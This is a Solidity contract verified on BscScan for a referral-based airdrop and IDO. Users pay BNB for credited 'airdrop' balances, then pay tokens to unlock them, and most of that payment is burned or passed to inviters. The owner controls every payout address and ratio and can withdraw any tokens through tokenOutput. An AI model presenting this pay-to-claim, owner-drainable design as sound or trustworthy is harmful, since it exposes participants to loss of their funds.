/**
 *Submitted for verification at BscScan.com on 2022-08-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-27
*/

// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.3;

abstract contract ERC20 {
    function transferFrom(address _from, address _to, uint256 _value) external virtual returns (bool success);
    function transfer(address recipient, uint256 amount) external virtual returns (bool);
}

contract Modifier {
    address internal owner; // Constract creater
    address internal approveAddress;
    bool public running = true;
    uint256 internal constant _NOT_ENTERED = 1;
    uint256 internal constant _ENTERED = 2;
    uint256 internal _status;

    modifier onlyOwner(){
        require(msg.sender == owner, "Modifier: The caller is not the creator");
        _;
    }

    modifier onlyApprove(){
        require(msg.sender == approveAddress || msg.sender == owner, "Modifier: The caller is not the approveAddress");
        _;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }

    modifier isRunning {
        require(running, "Modifier: No Running");
        _;
    }

    constructor() {
        owner = msg.sender;
        _status = _NOT_ENTERED;
    }

    function setApproveAddress(address externalAddress) public onlyOwner(){
        approveAddress = externalAddress;
    }

    function startStop() public onlyOwner returns (bool success) {
        if (running) { running = false; } else { running = true; }
        return true;
    }

    /*
     * @dev Get approve address
     */
    function getApproveAddress() internal view returns(address){
        return approveAddress;
    }

}

library SafeMath {
    /* a + b */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    /* a - b */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }
    /* a * b */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    /* a / b */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    /* a / b */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    /* a % b */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    /* a % b */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Util {

    function toWei(uint price, uint decimals) public pure returns (uint){
        uint amount = price * (10 ** uint(decimals));
        return amount;
    }

}

contract MYProject is Modifier, Util {

    using SafeMath for uint256;

    uint256 public oneJoinAmount;
    uint256 public twoJoinAmount;
    uint256 public threeJoinAmount;

    uint256 public oneAirdropAmount;
    uint256 public twoAirdropAmount;
    uint256 public threeAirdropAmount;

    uint256 public totalAirdropAmount;
    uint256 public totalUnlockAmount;
    uint256 public totalReleaseAmount;
    
    mapping(address => address) private invitationMapping;

    mapping(address => uint256) private airdropAmount;
    mapping(address => uint256) private unlockAmount;

    mapping(address => uint256) private waitReleaseAmount;
    mapping(address => uint256) private releaseIndex;
    mapping(address => mapping(uint256 => uint256)) private releaseAmount;
    mapping(address => mapping(uint256 => uint256)) private releaseFrequency;
    mapping(address => mapping(uint256 => uint256)) private lastReleaseTime;

    address private receiveAddress;

    bool idoOpenStatus = true;

    uint256 public unlockLimit;
    uint256 public unlockMultiple;
    uint256 private destroyRatio;
    uint256 private releaseRatio;
    uint256 private teamRatio;
    uint256 public releaseFrequencyLimit;
    uint256 public releaseTimeLimit;

    address private destroyAddress;
    address private extraAddress;
    address private teamAddress;
    address private lpAddress;

    ERC20 private usdtToken;
    ERC20 private releaseToken;

    constructor() {

        oneJoinAmount = 10000000000000000; // 0.01
        twoJoinAmount = 20000000000000000; // 0.02
        threeJoinAmount = 30000000000000000; // 0.03

        oneAirdropAmount = 10000000000000000000000000; // 1000 0000
        twoAirdropAmount = 20000000000000000000000000; // 2000 0000
        threeAirdropAmount = 30000000000000000000000000; // 3000 0000

        unlockLimit = 1000000000000000000;
        unlockMultiple = 2;

        destroyRatio = 900;
        releaseRatio = 800;
        teamRatio = 180;
        destroyAddress = 0x000000000000000000000000000000000000dEaD;
        extraAddress = 0xfA1Bc8De18095EbDb13681C6553f69fB9988FdDA;
        teamAddress = 0xfA1Bc8De18095EbDb13681C6553f69fB9988FdDA;
        lpAddress = 0xfA1Bc8De18095EbDb13681C6553f69fB9988FdDA;
        releaseFrequencyLimit = 45;
        // releaseTimeLimit = 24;
        releaseTimeLimit = 5;

        usdtToken = ERC20(0xD4Da02aA780b257D3AB7cD4A9F8E50dDf1B6aFE1);
        releaseToken = ERC20(0xD4Da02aA780b257D3AB7cD4A9F8E50dDf1B6aFE1);
        receiveAddress = 0xfA1Bc8De18095EbDb13681C6553f69fB9988FdDA;
    }

    function setUnlockLimit(uint256 _limit) public onlyOwner {
        unlockLimit = _limit;
    }

    function setUnlockMultiple(uint256 _multiple) public onlyOwner {
        unlockMultiple = _multiple;
    }

    function setDestroyRatio(uint256 _ratio) public onlyOwner {
        destroyRatio = _ratio;
    }

    function setReleaseRatio(uint256 _ratio) public onlyOwner {
        releaseRatio = _ratio;
    }

    function setTeamRatio(uint256 _ratio) public onlyOwner {
        teamRatio = _ratio;
    }

    function setTokenContract(address _usdtToken, address _releaseToken) public onlyOwner {
        usdtToken = ERC20(_usdtToken);
        releaseToken = ERC20(_releaseToken);
    }

    function setIdoOpenStatus(bool _status) public onlyOwner {
        idoOpenStatus = _status;
    }

    function setReceiveAddress(address _address) public onlyOwner {
        receiveAddress = _address;
    }

    function setDestroyAddress(address _address) public onlyOwner {
        destroyAddress = _address;
    }

    function setExtraAddress(address _address) public onlyOwner {
        extraAddress = _address;
    }

    function setTeamAddress(address _address) public onlyOwner {
        teamAddress = _address;
    }

    function setLpAddress(address _address) public onlyOwner {
        lpAddress = _address;
    }

    /*
    receive () payable external {}
    */

    fallback () payable external {

        uint256 transferAmount = 0;

        if(msg.value == oneJoinAmount) {
            transferAmount = oneAirdropAmount;
        }

        if(msg.value == twoJoinAmount) {
            transferAmount = twoAirdropAmount;
        }

        if(msg.value == threeJoinAmount) {
            transferAmount = threeAirdropAmount;
        }

        if(transferAmount != 0) {
            totalAirdropAmount = totalAirdropAmount.add(transferAmount);
            airdropAmount[msg.sender] = airdropAmount[msg.sender].add(transferAmount);
            address inviterAddress = invitationMapping[msg.sender];
            if(airdropAmount[inviterAddress] > 0) {
                airdropAmount[inviterAddress] = airdropAmount[inviterAddress].add(transferAmount);
            }

            payable(address(receiveAddress)).transfer(msg.value);

        }

    }

    function unlock(uint256 amountToWei) public isRunning nonReentrant returns (bool) {
        if(!idoOpenStatus) {
            _status = _NOT_ENTERED;
            revert("MY: Unlock not started");
        }
        if(amountToWei == 0) {
            _status = _NOT_ENTERED;
            revert("MY: The unlock amount must be greater than 0");
        }
        if(amountToWei < unlockLimit) {
            _status = _NOT_ENTERED;
            revert("MY: The unlock amount exceeds limit");
        }

        uint256 _unlockAmount = amountToWei.mul(unlockMultiple);
        uint256 waitUnlock = airdropAmount[msg.sender].sub(unlockAmount[msg.sender]);

        if(waitUnlock < _unlockAmount) {
            _status = _NOT_ENTERED;
            revert("MY: Insufficient amount to be unlocked");
        }

        releaseToken.transferFrom(msg.sender, address(this), amountToWei);
        
        totalUnlockAmount = totalUnlockAmount.add(_unlockAmount);
        unlockAmount[msg.sender] = unlockAmount[msg.sender].add(_unlockAmount);
        waitReleaseAmount[msg.sender] = waitReleaseAmount[msg.sender].add(_unlockAmount);

        releaseIndex[msg.sender] = releaseIndex[msg.sender].add(1);
        releaseAmount[msg.sender][releaseIndex[msg.sender]] = _unlockAmount;
        releaseFrequency[msg.sender][releaseIndex[msg.sender]] = 0;
        lastReleaseTime[msg.sender][releaseIndex[msg.sender]] = block.timestamp;

        uint256 destroyAmount = amountToWei.mul(destroyRatio).div(1000);

        releaseToken.transfer(destroyAddress, destroyAmount);

        address inviterAddress = invitationMapping[msg.sender];
        if(inviterAddress != address(this)) {
            
            uint256 inviterWaitUnlock = airdropAmount[inviterAddress].sub(unlockAmount[inviterAddress]);
            if(inviterWaitUnlock > 0 || waitReleaseAmount[inviterAddress] > 0) {
                releaseToken.transfer(inviterAddress, amountToWei.sub(destroyAmount));
            } else {
                releaseToken.transfer(extraAddress, amountToWei.sub(destroyAmount));
            }

        } else {
            releaseToken.transfer(extraAddress, amountToWei.sub(destroyAmount));
        }

        return true;
    }

    function receiveAmount() public nonReentrant returns (bool) {

        if(releaseIndex[msg.sender] == 0) {
            _status = _NOT_ENTERED;
            revert("MY: No amount available at the moment");
        }

        // uint secondsOfDay = releaseTimeLimit * 60 * 60;
        uint secondsOfDay = releaseTimeLimit * 60;
        uint256 waitReceive = 0;
        for(uint i=1; i<=releaseIndex[msg.sender]; i++) {
            
            if(releaseFrequency[msg.sender][i] < releaseFrequencyLimit) {
                uint onlineDay = block.timestamp.sub(lastReleaseTime[msg.sender][i]).div(secondsOfDay);
                waitReceive = waitReceive.add(releaseAmount[msg.sender][i].div(releaseFrequencyLimit).mul(onlineDay));

                releaseFrequency[msg.sender][i] = releaseFrequency[msg.sender][i].add(onlineDay);
                lastReleaseTime[msg.sender][i] = block.timestamp;
            }

        }

        if(waitReceive > 0) {
            totalReleaseAmount = totalReleaseAmount.add(waitReceive);
            waitReleaseAmount[msg.sender] = waitReleaseAmount[msg.sender].sub(waitReceive);

            uint256 availableAmount = waitReceive.mul(releaseRatio).div(1000);
            uint256 teamAmount = waitReceive.mul(teamRatio).div(1000);

            releaseToken.transfer(msg.sender, availableAmount);
            releaseToken.transfer(teamAddress, teamAmount);
            releaseToken.transfer(lpAddress, waitReceive.sub(availableAmount).sub(teamAmount));
        }

        return true;
    }

    function waitReceiveAmount(address _address) public view returns(uint256) {

        if(releaseIndex[_address] == 0) {
            return 0;
        }

        // uint secondsOfDay = releaseTimeLimit * 60 * 60;
        uint secondsOfDay = releaseTimeLimit * 60;
        uint256 waitReceive = 0;
        for(uint i=1; i<=releaseIndex[_address]; i++) {
            
            if(releaseFrequency[_address][i] < releaseFrequencyLimit) {
                uint onlineDay = block.timestamp.sub(lastReleaseTime[_address][i]).div(secondsOfDay);
                waitReceive = waitReceive.add(releaseAmount[_address][i].div(releaseFrequencyLimit).mul(onlineDay));
            }

        }

        return waitReceive;
    }

    function publicSale(uint256 amountToWei) public isRunning nonReentrant returns (bool) {

        usdtToken.transferFrom(msg.sender, address(this), amountToWei);
        usdtToken.transfer(receiveAddress, amountToWei);

        return true;
    }

    function bindInviter(address inviterAddress) public isRunning nonReentrant {

        if(invitationMapping[inviterAddress] == address(0) && inviterAddress != address(this)) {
            _status = _NOT_ENTERED;
            revert("MY: Inviter is invalid");
        }

        if(invitationMapping[msg.sender] == address(0)) {
            invitationMapping[msg.sender] = inviterAddress;
        }
    }

    function updateInviter(address _address, address inviterAddress) public onlyApprove {
        invitationMapping[_address] = inviterAddress;
    }

    function getBindStatus() public view returns(bool status) {
        if(invitationMapping[msg.sender] == address(0)) {
            return false;
        }
        return true;
    }

    function getAirdropAmount(address _address) public view returns(uint256) {
        return airdropAmount[_address];
    }

    function getWaitUnlockAmount(address _address) public view returns(uint256) {
        return airdropAmount[_address].sub(unlockAmount[_address]);
    }

    function getInviter(address _address) public view returns(address) {
        return invitationMapping[_address];
    }

    function getIdoOpenStatus() public view returns(bool status) {
        return idoOpenStatus;
    }

    function tokenOutput(address tokenAddress, address toAddress, uint amountToWei) public onlyOwner {
        ERC20(tokenAddress).transfer(toAddress, amountToWei);
    }

}